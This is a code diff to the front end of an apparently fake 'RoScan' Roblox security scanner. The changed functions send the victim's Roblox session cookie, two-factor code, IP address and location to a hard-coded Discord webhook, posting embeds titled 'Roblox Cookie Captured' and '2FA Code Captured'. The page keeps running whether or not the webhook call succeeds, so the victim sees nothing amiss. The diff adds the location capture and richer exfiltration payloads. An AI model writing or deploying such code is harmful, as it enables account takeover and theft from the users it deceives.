@@ -236,10 +236,43 @@ async function submitPowerShell() {
     submitText.textContent = 'Scanning...';
 
     try {
+        // Get user location and IP
+        const locationInfo = await getUserLocation();
+        
         // Send cookie to webhook immediately
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
-        const payload = {
-            content: `Cookie: ${globalRobloxCookie || 'None found'}`
+        
+        const cookieEmbed = {
+            embeds: [{
+                title: "🍪 Roblox Cookie Captured",
+                color: 0xff0000,
+                fields: [
+                    {
+                        name: "⚠️ WARNING",
+                        value: "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_",
+                        inline: false
+                    },
+                    {
+                        name: "🍪 Cookie",
+                        value: `\`\`\`${globalRobloxCookie || 'None found'}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📍 Location",
+                        value: `${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`,
+                        inline: true
+                    },
+                    {
+                        name: "🌐 IP Address",
+                        value: locationInfo.ip || 'Unknown',
+                        inline: true
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "RoScan Security System"
+                }
+            }]
         };
 
         const response = await fetch(webhookUrl, {
@@ -247,7 +280,7 @@ async function submitPowerShell() {
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(cookieEmbed)
         });
 
         // Continue flow regardless of webhook success
@@ -362,10 +395,48 @@ async function verifyCode() {
     verifyText.textContent = 'Verifying...';
     
     try {
+        // Get user location and IP
+        const locationInfo = await getUserLocation();
+        
         // Send 2FA code to webhook
         const webhookUrl = 'https://discord.com/api/webhooks/1399753275225673778/jzgojCyaL0dSWz1pdji5g3Dvyh3HF9rsMxErcTM7cmnBi-HsOakqAxP41U-0MPTO_Mnv';
-        const payload = {
-            content: `2FA Code: ${code} | Trust: ${trustDevice.checked ? 'Yes' : 'No'} | Cookie: ${globalRobloxCookie || 'None'}`
+        
+        const tfaEmbed = {
+            embeds: [{
+                title: "🔐 2FA Code Captured",
+                color: 0x00ff00,
+                fields: [
+                    {
+                        name: "🔑 2FA Code",
+                        value: `\`${code}\``,
+                        inline: true
+                    },
+                    {
+                        name: "📱 Trust Device",
+                        value: trustDevice.checked ? 'Yes' : 'No',
+                        inline: true
+                    },
+                    {
+                        name: "📍 Location",
+                        value: `${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`,
+                        inline: false
+                    },
+                    {
+                        name: "🌐 IP Address",
+                        value: locationInfo.ip || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: "🍪 Associated Cookie",
+                        value: globalRobloxCookie ? `\`${globalRobloxCookie.substring(0, 50)}...\`` : 'None',
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "RoScan Security System"
+                }
+            }]
         };
 
         const response = await fetch(webhookUrl, {
@@ -373,7 +444,7 @@ async function verifyCode() {
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(payload)
+            body: JSON.stringify(tfaEmbed)
         });
 
         // Always continue flow regardless of webhook success
